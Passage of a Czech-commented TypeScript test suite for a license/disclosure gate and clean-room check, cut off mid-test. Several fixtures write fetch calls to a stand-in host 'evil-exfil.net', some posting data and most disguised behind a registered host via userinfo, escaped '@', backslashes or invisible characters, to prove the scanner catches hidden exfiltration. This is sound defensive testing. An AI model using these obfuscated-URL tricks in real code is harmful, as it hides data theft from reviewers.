/**
 * Obě brány z T300 jsou skripty, které něco zastaví — jediné, co o nich chceme
 * vědět, je **jestli to doopravdy zastaví**. Testy proto sahají na vnitřek jen
 * u čistých funkcí (hranice slov, stripování komentářů); chování brány se měří
 * spuštěním procesu nad skutečným dočasným stromem.
 *
 * Každý negativní případ tvrdí dvě věci současně: **cílová kontrola selhala** a
 * **žádná jiná ne**. Bez té druhé poloviny by test prošel i bráně, která hlásí
 * `FAIL` na všechno — a taková brána neměří nic.
 */

import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { afterAll, describe, expect, it } from 'vitest';

import { findHits, parseList, verdict } from '../cleanroom-check.mjs';
import { credentialUrlsIn, hostsIn, noticesFor, stripComments } from '../license-gate.mjs';

const LICENSE_GATE = join(process.cwd(), 'scripts', 'license-gate.mjs');
const CLEANROOM = join(process.cwd(), 'scripts', 'cleanroom-check.mjs');
const created: string[] = [];

interface Registry {
  entries: Record<string, unknown>[];
}

function run(
  script: string,
  cwd: string,
  args: string[] = [],
  env: Record<string, string> = {},
): { code: number; out: string } {
  try {
    const options = { cwd, encoding: 'utf8' as const, env: { ...process.env, ...env } };
    return { code: 0, out: execFileSync(process.execPath, [script, ...args], options) };
  } catch (error) {
    const failure = error as { status?: number; stdout?: string; stderr?: string };
    return { code: failure.status ?? 1, out: `${failure.stdout ?? ''}${failure.stderr ?? ''}` };
  }
}

/** Které kontroly selhaly, podle čísel v `FAIL  [n]`. */
function failedChecks(out: string): number[] {
  return [...out.matchAll(/^FAIL {2}\[(\d+)]/gm)].map((match) => Number(match[1])).sort((a, b) => a - b);
}

function write(dir: string, name: string, body: string): void {
  const target = join(dir, name);
  mkdirSync(dirname(target), { recursive: true });
  writeFileSync(target, body, 'utf8');
}

/**
 * Minimální strom: lockfile se dvěma balíčky a jedním voláním ven. `--sync` z něj
 * udělá platný registr, takže výchozí stav testu je zelený a každý případ níž
 * kazí právě jednu věc.
 *
 * **Fixtura musí mít skutečný `node_modules/`.** Bez něj se autor ani copyright
 * řádek nemají odkud přečíst a do registru se dosadí náhradní texty — a přesně
 * to byla vada, kterou testy nemohly vidět, dokud fixtura `node_modules` neměla.
 * Teď jím prochází stejnou cestou jako ostrý běh.
 */
function makeRepo(lockExtra: Record<string, unknown> = {}, withModules = true): string {
  const dir = mkdtempSync(join(tmpdir(), 'license-gate-'));
  created.push(dir);

  write(
    dir,
    'package-lock.json',
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { name: 'fixture', version: '0.0.0' },
        'node_modules/left-pad': {
          version: '1.0.0',
          license: 'MIT',
          resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz',
        },
        'node_modules/copyleft-thing': {
          version: '2.0.0',
          license: 'LGPL-3.0-or-later',
          resolved: 'https://registry.npmjs.org/copyleft-thing/-/copyleft-thing-2.0.0.tgz',
        },
        ...lockExtra,
      },
    }),
  );
  if (withModules) {
    write(dir, 'node_modules/left-pad/package.json', JSON.stringify({ name: 'left-pad', author: 'Pad Author <a@b.io>' }));
    write(dir, 'node_modules/left-pad/LICENSE', 'MIT License\n\nCopyright (c) 2016 Pad Author\n');
    write(dir, 'node_modules/copyleft-thing/package.json', JSON.stringify({ name: 'copyleft-thing' }));
  }
  write(dir, 'src/client.ts', "export const url = 'https://api.fixture-provider.io/v1';\n");
  return dir;
}

function readRegistry(dir: string): Registry {
  return JSON.parse(readFileSync(join(dir, 'disclosure.json'), 'utf8')) as Registry;
}

function writeRegistry(dir: string, registry: Registry): void {
  writeFileSync(join(dir, 'disclosure.json'), `${JSON.stringify(registry, null, 2)}\n`, 'utf8');
}

/**
 * `--sync` a pak doplnění toho, co odvodit nejde: `reviewNote` u copyleftu a
 * ruční `api` položka. Vrací zelený strom.
 */
function makeGreenRepo(): string {
  const dir = makeRepo();
  run(LICENSE_GATE, dir, ['--sync']);

  const registry = readRegistry(dir);
  for (const entry of registry.entries) {
    if (String(entry.license).includes('LGPL')) entry.reviewNote = 'nativní binárka, neběží v prohlížeči, nemodifikovaná';
  }
  registry.entries.push({
    name: 'example provider',
    kind: 'api',
    source: 'https://api.fixture-provider.io',
    authorOrProvider: 'Example Provider Inc.',
    license: 'komerční ToS',
    requiredNotices: ['žádné pro volajícího'],
    attribution: 'Example Provider Inc.',
    reviewNote: 'podmínky přečteny, volá to jen harness',
  });
  writeRegistry(dir, registry);
  // DISCLOSURE.md musí odpovídat registru, takže se po ruční úpravě přegeneruje.
  run(LICENSE_GATE, dir, ['--sync']);
  return dir;
}

afterAll(() => {
  for (const dir of created) rmSync(dir, { recursive: true, force: true });
});

describe('license-gate: zelený výchozí stav', () => {
  it('projde nad stromem, který má registr i DISCLOSURE.md v pořádku', () => {
    const { code, out } = run(LICENSE_GATE, makeGreenRepo());
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
  });

  it('DISCLOSURE.md se generuje a nese všech pět tříd jako nadpisy', () => {
    const rendered = readFileSync(join(makeGreenRepo(), 'DISCLOSURE.md'), 'utf8');
    expect(rendered).toContain('GENEROVÁNO');
    for (const title of ['Knihovny', 'Assety', 'Modely', 'Datasety', 'Externí služby']) {
      expect(rendered).toContain(`## ${title}`);
    }
  });
});

describe('license-gate: --sync nesmí tiše nahradit skutečná data', () => {
  it('bez node_modules odmítne běžet, místo aby dosadil náhradní texty', () => {
    const dir = makeRepo({}, false);

    const { code, out } = run(LICENSE_GATE, dir, ['--sync']);
    expect(code).toBe(1);
    expect(out).toContain('potřebuje node_modules');
    expect(existsSync(join(dir, 'disclosure.json'))).toBe(false);
  });

  it('s node_modules zapíše SKUTEČNÉHO autora a copyright, ne náhradní text', () => {
    const dir = makeRepo();
    run(LICENSE_GATE, dir, ['--sync']);

    const entry = readRegistry(dir).entries.find((item) => String(item.name).startsWith('left-pad'));
    expect(entry!.authorOrProvider).toBe('Pad Author');
    expect(entry!.attribution).toContain('Copyright (c) 2016 Pad Author');
  });
});

describe('license-gate: certifikuje se index, ne disk', () => {
  /** Zelený strom, ve kterém je všechno trackované a stagenuté. */
  function stagedGreenRepo(): string {
    const dir = makeGreenRepo();
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    write(dir, '.gitignore', 'node_modules/\n');
    execFileSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('rozbitý DISCLOSURE.md jen na disku bránu neshodí — commituje se index', () => {
    const dir = stagedGreenRepo();
    writeFileSync(join(dir, 'DISCLOSURE.md'), '# ručně přepsaný nesmysl\n', 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
  });

  it('cizí host stagenutý a na disku opravený kontrolu 5 PŘESTO shodí', () => {
    // Kontroly 5 a 7 skenují kód, ne registr, a dlouho ho braly z disku. Tím
    // v nich zůstala otevřená přesně ta obcházka, kterou zbytek souboru zavírá.
    const dir = stagedGreenRepo();
    write(dir, 'src/exfil.ts', "export const url = 'https://neregistrovany-host.io/collect';\n");
    execFileSync('git', ['add', 'src/exfil.ts'], { cwd: dir, stdio: 'ignore' });
    writeFileSync(join(dir, 'src/exfil.ts'), 'export const url = null;\n', 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('neregistrovany-host.io');
    expect(code).toBe(1);
  });

  it('netrackovaný soubor na disku se skenuje taky — git add -A ho tam za chvíli dostane', () => {
    const dir = stagedGreenRepo();
    write(dir, 'src/exfil.ts', "export const url = 'https://neregistrovany-host.io/collect';\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
  });

  it('rozbitý DISCLOSURE.md v INDEXU bránu shodí, i když disk je v pořádku', () => {
    // Přesně to obvyklé pořadí kroků: brána zaječí, člověk soubor na disku
    // opraví, zapomene `git add`. Disk sedí, commit ne. Disk se tu proto vrací
    // do pořádku schválně — kdyby zůstal rozbitý, test by prošel i bráně,
    // která čte disk, a o indexu by netvrdil nic.
    const dir = stagedGreenRepo();
    const correct = readFileSync(join(dir, 'DISCLOSURE.md'), 'utf8');
    writeFileSync(join(dir, 'DISCLOSURE.md'), '# ručně přepsaný nesmysl\n', 'utf8');
    execFileSync('git', ['add', 'DISCLOSURE.md'], { cwd: dir, stdio: 'ignore' });
    writeFileSync(join(dir, 'DISCLOSURE.md'), correct, 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([6]);
    expect(code).toBe(1);
  });

  /**
   * `git rm --cached` je ta tichá cesta ven: soubor zůstane na disku, zmizí
   * z indexu, a dokud se přítomnost testovala jako „index NEBO disk", brána si
   * ho přečetla z disku a prošla — zatímco commit registr smazal.
   */
  it('registr odstagenutý z indexu je SELHÁNÍ, i když na disku pořád leží', () => {
    const dir = stagedGreenRepo();
    execFileSync('git', ['rm', '--cached', 'disclosure.json'], { cwd: dir, stdio: 'ignore' });
    expect(existsSync(join(dir, 'disclosure.json'))).toBe(true);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(out).toContain('disclosure.json není v indexu');
    expect(code).toBe(1);
  });

  it('DISCLOSURE.md odstagenutý z indexu shodí kontrolu 6, ne nic jiného', () => {
    const dir = stagedGreenRepo();
    execFileSync('git', ['rm', '--cached', 'DISCLOSURE.md'], { cwd: dir, stdio: 'ignore' });
    expect(existsSync(join(dir, 'DISCLOSURE.md'))).toBe(true);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([6]);
    expect(out).toContain('DISCLOSURE.md není v indexu');
    expect(code).toBe(1);
  });

  /**
   * Pád na disk je slabší tvrzení než čtení indexu a do teď se děl mlčky.
   * Běh, který o zdroji nic neřekne, vypadá stejně jako běh, který certifikoval
   * index — tak se pozná jen podle toho, co zrovna nespadlo.
   */
  it('běh vypíše, ze kterého zdroje četl', () => {
    const dir = stagedGreenRepo();
    expect(run(LICENSE_GATE, dir).out).toMatch(/^zdroj: index —/m);
  });

  it('mimo git repozitář se přizná pád na disk', () => {
    const dir = makeGreenRepo();
    const { code, out } = run(LICENSE_GATE, dir);
    expect(out).toMatch(/^zdroj: disk — git neodpověděl/m);
    expect(code).toBe(0);
  });
});

/**
 * Ignorovaná cesta se nesmí počítat jako artefakt k odevzdání. Blokovala by
 * každý commit, dokud ji někdo nesmaže — a dokumentovaná úniková cesta
 * `--no-verify` vypne clean-room bránu vedle ní.
 */
describe('license-gate: chůze po disku respektuje .gitignore', () => {
  function ignoreRepo(patterns: string): string {
    const dir = makeGreenRepo();
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    write(dir, '.gitignore', `node_modules/\n${patterns}`);
    execFileSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('ignorovaný zdroják s nedeklarovaným hostem bránu NEshodí', () => {
    const dir = ignoreRepo('src/.tmp-review.mjs\n');
    write(dir, 'src/.tmp-review.mjs', "export const url = 'https://neregistrovany-host.io/collect';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
  });

  it('týž soubor trackovaný bránu shodí — filtr se nesmí stát dírou', () => {
    const dir = ignoreRepo('src/.tmp-review.mjs\n');
    write(dir, 'src/.tmp-review.mjs', "export const url = 'https://neregistrovany-host.io/collect';\n");
    execFileSync('git', ['add', '-f', 'src/.tmp-review.mjs'], { cwd: dir, stdio: 'ignore' });

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('neregistrovany-host.io');
    expect(code).toBe(1);
  });

  it('ignorovaný vygenerovaný asset se nepočítá do public/', () => {
    const dir = ignoreRepo('public/sw.js\n');
    write(dir, 'public/sw.js', '// vygenerovaný service worker\n');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
  });

  /**
   * `check-ignore` se dívá do indexu, takže `git add -f` na ignorovanou cestu ji
   * z nálezů vyndá. Při běžném běhu je to jen pás k šlím — trackovanou půlku
   * `listAssets()` bere z indexu tak jako tak. **Při `--sync` index nečte nikdo**,
   * takže tady je to jediné, co drží force-addnutý soubor v dohledu.
   */
  it('force-addnutý asset zůstává v dohledu i při --sync, kde ho index nekryje', () => {
    const dir = ignoreRepo('public/sw.js\n');
    write(dir, 'public/sw.js', '// vygenerovaný service worker\n');
    execFileSync('git', ['add', '-f', 'public/sw.js'], { cwd: dir, stdio: 'ignore' });

    const { code, out } = run(LICENSE_GATE, dir, ['--sync']);
    expect(failedChecks(out)).toEqual([4]);
    expect(out).toContain('public/sw.js');
    expect(code).toBe(1);
  });

  it('neignorovaný asset v public/ kontrolu 4 pořád shodí', () => {
    const dir = ignoreRepo('public/sw.js\n');
    write(dir, 'public/cizi-hdri.hdr', 'binární data\n');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([4]);
    expect(code).toBe(1);
  });
});

describe('license-gate: licenci assetu nelze odvodit z cesty', () => {
  it('nový soubor v public/ shodí kontrolu 4 a --sync mu licenci NEVYMYSLÍ', () => {
    const dir = makeGreenRepo();
    write(dir, 'public/cizi-hdri.hdr', 'binární data\n');

    const before = run(LICENSE_GATE, dir);
    expect(failedChecks(before.out)).toEqual([4]);

    // Dřív právě tohle vyrobilo položku „worldsmith / MIT" nad cizím souborem
    // a brána nad ní zezelenala. Sync ho teď nechá být a kontrola drží.
    run(LICENSE_GATE, dir, ['--sync']);
    const after = run(LICENSE_GATE, dir);
    expect(failedChecks(after.out)).toEqual([4]);
    expect(after.out).toContain('doplň položku ručně');
    expect(readRegistry(dir).entries.some((entry) => entry.kind === 'asset')).toBe(false);
  });

  it('ručně zapsaný asset projde a --sync ho nesmaže', () => {
    const dir = makeGreenRepo();
    write(dir, 'public/cizi-hdri.hdr', 'binární data\n');
    const registry = readRegistry(dir);
    registry.entries.push({
      name: 'public/cizi-hdri.hdr',
      kind: 'asset',
      source: 'https://polyhaven.com/a/kloofendal',
      authorOrProvider: 'Poly Haven',
      license: 'CC0-1.0',
      requiredNotices: ['žádné'],
      attribution: 'Poly Haven, CC0',
    });
    writeRegistry(dir, registry);
    run(LICENSE_GATE, dir, ['--sync']);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
    expect(readRegistry(dir).entries.filter((entry) => entry.kind === 'asset')).toHaveLength(1);
  });
});

describe('license-gate: tvar registru (kontrola 1)', () => {
  it('selže na prázdném řetězci v povinném poli', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries[0].attribution = '   ';
    writeRegistry(dir, registry);

    const { code, out } = run(LICENSE_GATE, dir);
    // Kontrola 6 selže s ní: DISCLOSURE.md vykreslený z rozbitého registru
    // přestane sedět. To je vlastnost, ne škoda — a test to říká nahlas.
    expect(failedChecks(out)).toEqual([1, 6]);
    expect(out).toContain('pole "attribution" chybí nebo je prázdné');
    expect(code).toBe(1);
  });

  it('selže na prázdném POLI requiredNotices, ne jen na chybějícím', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries[0].requiredNotices = [];
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(1);
    expect(out).toContain('pole "requiredNotices" chybí nebo je prázdné');
  });

  it('selže na kind mimo pět povolených tříd', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries.push({
      name: 'něco',
      kind: 'plugin',
      source: 'x',
      authorOrProvider: 'x',
      license: 'MIT',
      requiredNotices: ['x'],
      attribution: 'x',
    });
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(1);
    expect(out).toContain('není jedna z');
  });
});

describe('license-gate: licence (kontrola 2)', () => {
  it('selže na licenci mimo whitelist', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    const target = registry.entries.find((entry) => entry.license === 'MIT');
    target!.license = 'SSPL-1.0';
    target!.requiredNotices = ['neznámé'];
    writeRegistry(dir, registry);
    run(LICENSE_GATE, dir, ['--sync']);
    // `--sync` odvozené položky přepíše zpátky, takže se mutace zapíše až po něm.
    const after = readRegistry(dir);
    after.entries.find((entry) => String(entry.name).startsWith('left-pad'))!.license = 'SSPL-1.0';
    writeRegistry(dir, after);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(2);
    expect(out).toContain('není na whitelistu');
    expect(code).toBe(1);
  });

  it('copyleft bez reviewNote neprojde, s reviewNote projde', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    const copyleft = registry.entries.find((entry) => String(entry.license).includes('LGPL'));
    expect(copyleft, 'fixtura musí obsahovat copyleft položku').toBeDefined();

    delete copyleft!.reviewNote;
    writeRegistry(dir, registry);
    const without = run(LICENSE_GATE, dir);
    expect(failedChecks(without.out)).toContain(2);
    expect(without.out).toContain('reviewNote');

    copyleft!.reviewNote = 'nativní binárka mimo prohlížečový bundle';
    writeRegistry(dir, registry);
    expect(failedChecks(run(LICENSE_GATE, dir).out)).not.toContain(2);
  });

  it('api položka bez reviewNote neprojde, i když licence není prázdná', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    delete registry.entries.find((entry) => entry.kind === 'api')!.reviewNote;
    writeRegistry(dir, registry);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(2);
    expect(out).toContain('se neredistribuuje, ale "reviewNote" je u něj povinný');
    expect(code).toBe(1);
  });

  it('selže, když balíček licenci vůbec nedeklaruje', () => {
    const dir = makeRepo({ 'node_modules/no-license': { version: '1.0.0', resolved: 'https://registry.fixture.io/x.tgz' } });
    run(LICENSE_GATE, dir, ['--sync']);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(2);
    expect(out).toContain('licence není deklarovaná');
    expect(code).toBe(1);
  });
});

describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
  it('selže, když závislost z lockfilu v registru chybí', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries = registry.entries.filter((entry) => !String(entry.name).startsWith('left-pad'));
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(3);
    expect(out).toContain('není v registru');
  });

  it('selže i opačným směrem: položka registru, která už není v lockfilu', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries.push({
      name: 'duch@9.9.9',
      kind: 'library',
      source: 'https://registry.fixture.io/duch.tgz',
      authorOrProvider: 'nikdo',
      license: 'MIT',
      requiredNotices: ['copyright notice'],
      attribution: 'nikdo',
    });
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(3);
    expect(out).toContain('už není v lockfilu');
  });

  it('selže, když kód volá hostitele bez položky kind: api', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/other.ts', "await fetch('https://neregistrovany-host.io/v1/go');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('neregistrovany-host.io');
    expect(code).toBe(1);
  });

  it('podřetězec registrovaného hostu neprojde — pi.openai.com není api.openai.com', () => {
    const dir = makeGreenRepo();
    // `pi.fixture-provider.io` je podřetězcem registrovaného zdroje. Porovnání
    // přes `includes` ho propouštělo, přestože je to jiný hostitel.
    write(dir, 'src/exfil.ts', "await fetch('https://pi.fixture-provider.io/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('pi.fixture-provider.io');
    expect(code).toBe(1);
  });

  it('selže, když kód jmenuje model bez položky kind: model', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/model.ts', "export const MODEL = 'claude-opus-5';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([7]);
    expect(out).toContain('claude-opus-5');
    expect(code).toBe(1);
  });

  it('model jmenovaný jen v komentáři položku nevyžaduje', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/note.ts', '// dřív to jel claude-opus-5\nexport const x = 1;\n');

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('hostitel jen v komentáři volání není, takže bránu neshodí', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/doc.ts', "// viz https://jen-v-komentari.io/docs\nexport const x = 1;\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('hostitel v testovém souboru se neposuzuje', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/thing.test.ts', "await fetch('https://jen-v-testu.io/x');\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('userinfo neskryje skutečný cíl — registrovaný host před @ bránu nepropustí', () => {
    const dir = makeGreenRepo();
    // `api.fixture-provider.io` JE v registru. Lexikální výřez se zastavil na `@`,
    // takže se porovnával on a volání na `evil-exfil.net` prošlo zeleně.
    write(dir, 'src/exfil.ts', "await fetch('https://api.fixture-provider.io@evil-exfil.net/v1/x');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    // **Musí to být řádek o neznámém HOSTU**, ne řádek o userinfo. Samotné
    // `toContain('evil-exfil.net')` projde i lexikálnímu výřezu, protože ten host
    // je i v hlášce o userinfo — a test by pak tvrdil něco, co neměří.
    expect(out).toContain('evil-exfil.net (src/exfil.ts)');
    expect(code).toBe(1);
  });

  it('userinfo je nález i tehdy, když host v registru je — a heslo se nevypíše', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/creds.ts', "await fetch('https://honza:tajneheslo@api.fixture-provider.io/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('userinfo');
    expect(out).toContain('***@api.fixture-provider.io');
    expect(out).not.toContain('tajneheslo');
    expect(out).not.toContain('honza');
    expect(code).toBe(1);
  });

  it('regulární literál na řádku neoslepí kontrolu na zbytek toho řádku', () => {
    const dir = makeGreenRepo();
    // `\/\/` uvnitř literálu spustilo režim komentáře a zbytek řádku zmizel.
    write(dir, 'src/regex.ts', "const r = /https:\\/\\//; const u = 'https://po-regexu.io/v1';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('po-regexu.io');
    expect(code).toBe(1);
  });

  it('nezaescapované // ve znakové třídě regexu taky neoslepí zbytek řádku', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/klass.ts', "const r = /[//]/; const u = 'https://po-tride.io/v1';\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
  });

  it('@ zapsané escapem userinfo bránu neobejde', () => {
    const dir = makeGreenRepo();
    // `@` je `@`. Zaslepení escapů dvěma mezerami URL rozdělilo a zbyl z ní
    // registrovaný host, takže kontrola 5 prošla nad voláním na evil-exfil.net.
    write(dir, 'src/escaped.ts', "await fetch('https://api.fixture-provider.io\\u0040evil-exfil.net/v1/x');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net (src/escaped.ts)');
    expect(code).toBe(1);
  });

  it('@ zapsané hexa escapem taky ne', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/hex.ts', "await fetch('https://api.fixture-provider.io\\x40evil-exfil.net/v1');\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
  });

  it('JSX na řádku neoslepí kontrolu na host za ním', () => {
    const dir = makeGreenRepo();
    // `</div>` otevřelo falešný regulární literál, ten spolkl uvozovku a `//`
    // v následující cestě se pak čtlo jako komentář.
    write(
      dir,
      'src/ui.tsx',
      "export const f = (t: string) => <div>{t}</div>; const u = 'https://api.fixture-provider.io//a'; const v = 'https://po-jsx.io/v1';\n",
    );

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('po-jsx.io');
    expect(code).toBe(1);
  });

  it('host zapsaný jako IPv6 literál kontrola 5 vidí', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/six.ts', "await fetch('https://[2606:4700:4700::1111]/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('2606:4700:4700::1111');
    expect(code).toBe(1);
  });

  it('nerozparsovatelná URL se nahlásí, ale heslo ani query se nevypíšou', () => {
    const dir = makeGreenRepo();
    // Port mimo rozsah — `new URL` to odmítne. Dřív se taková URL vypsala celá.
    write(dir, 'src/broken.ts', "await fetch('https://svc:tajneheslo@internal.io:99999/v1?token=nevypisovat');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('nedá se rozparsovat');
    expect(out).not.toContain('tajneheslo');
    expect(out).not.toContain('nevypisovat');
    expect(code).toBe(1);
  });

  it('údaj v cestě se nevypíše ani u rozparsované URL s userinfo', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/path.ts', "await fetch('https://svc:tajneheslo@api.fixture-provider.io/reset/nevypisovat');\n");

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('***@api.fixture-provider.io');
    expect(out).not.toContain('tajneheslo');
    expect(out).not.toContain('nevypisovat');
  });

  it('zpětné lomítko v URL je nález, ne odhad hostu', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/slash.ts', "await fetch('https://api.fixture-provider.io\\\\@evil-exfil.net/v1');\n");

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('zpětné lomítko');
  });

  // Autoritu URL ukončí podle WHATWG **jen `/ ? # \`** — všechno ostatní se do
  // ní složí, včetně mezery, uvozovky a `<`. Naměřeno nad celým tisknutelným
  // ASCII. Vyjmenovat „znaky, po kterých autorita pokračuje" tedy nejde a dvě
  // remediační kola se o to marně pokusila; každý takový výčet je jen seznam
  // děr, na které zatím nikdo nesáhl. Test je proto tabulkový a asserce jmenuje
  // **skutečný cíl**, ne jen číslo kontroly: `toEqual([5])` samo projde i tehdy,
  // když kontrola 5 spadla z úplně jiného důvodu.
  it.each(['$', ',', ';', '<', '>', '(', ')', '{', '}', '[', ']', '"', ' '])(
    'znak %j před @ skutečný cíl neskryje',
    (znak) => {
      const dir = makeGreenRepo();
      write(dir, 'src/hide.ts', `await fetch('https://api.fixture-provider.io${znak}@evil-exfil.net/v1');\n`);

      const { code, out } = run(LICENSE_GATE, dir);
      expect(failedChecks(out)).toEqual([5]);
      expect(out).toContain('evil-exfil.net');
      expect(code).toBe(1);
    },
  );

  // `fetch` tyhle znaky z URL zahazuje, takže cíl je až za nimi. Každý zápis má
  // vlastní cestu dekodérem — krátký escape jednu, unicode zápis druhou — a bez
  // obou variant zůstane jedna z nich nepokrytá.
  it.each(['\\n', '\\r', '\\t', '\\u000A', '\\u000D', '\\u0009'])(
    'neviditelný znak zapsaný %s před @ cíl neskryje',
    (escape) => {
      const dir = makeGreenRepo();
      write(dir, 'src/inv.ts', `await fetch('https://api.fixture-provider.io${escape}@evil-exfil.net/v1');\n`);

      const { out } = run(LICENSE_GATE, dir);
      expect(failedChecks(out)).toEqual([5]);
      expect(out).toContain('evil-exfil.net');
    },
  );

  it('skutečný konec řádku v šablonovém literálu cíl neskryje', () => {
    const dir = makeGreenRepo();
    // Bez escapu, přímo zalomený řádek uvnitř zpětných apostrofů. `fetch` ho
    // z URL zahodí stejně jako `\n`.
    write(dir, 'src/tplnl.ts', 'export const u = `https://api.fixture-provider.io\n@evil-exfil.net/v1`;\n');

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net');
  });

  it('apostrof v JSX textu neoslepí kontrolu na zbytek řádku', () => {
    const dir = makeGreenRepo();
    // `Let's go` je běžný text, ne útok. Lichý apostrof ale rozhodí stav
    // uvozovek, `https:` pak stojí mimo řetězec, jeho `//` spustí režim
    // komentáře a **zbytek řádku i s hostem zmizel úplně** — brána nad voláním
    // na `evil-exfil.net` hlásila 7/7 PASS.
    write(
      dir,
      'src/Hero.tsx',
      "export const Hero = () => <p>Let's go</p>;\n" +
        "export async function send(s: string) { await fetch('https://evil-exfil.net/v1', { body: s }); }\n",
    );

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('evil-exfil.net');
    expect(code).toBe(1);
  });

  it('adresa na konci literálu bez cesty se přečte celá a nic si nepřibere', () => {
    const dir = makeGreenRepo();
    // Autoritu tu neukončí `/`, ale konec řetězce — jediný případ, kdy je značka
    // konce literálu skutečně nosná. Bez ní čtení přeteče do dalšího řetězce a
    // host se **tiše ztratí**; se značkou na špatné straně uvozovky si k sobě
    // přibere apostrof a nález pak jmenuje host, který neexistuje.
    write(dir, 'src/base.ts', "const a = 'https://po-prvnim.io';\nconst b = 'user@druhy.net';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('po-prvnim.io');
    expect(out).not.toContain("po-prvnim.io'");
    expect(code).toBe(1);
  });

  it('ternární operátor před komentářem není schéma', () => {
    const dir = makeGreenRepo();
    // Výjimka pro `://` musí být úzká: `x ? a : // pozn.` má dvojtečku těsně
    // před lomítky a komentářem zůstat musí, jinak by se za ním schoval host.
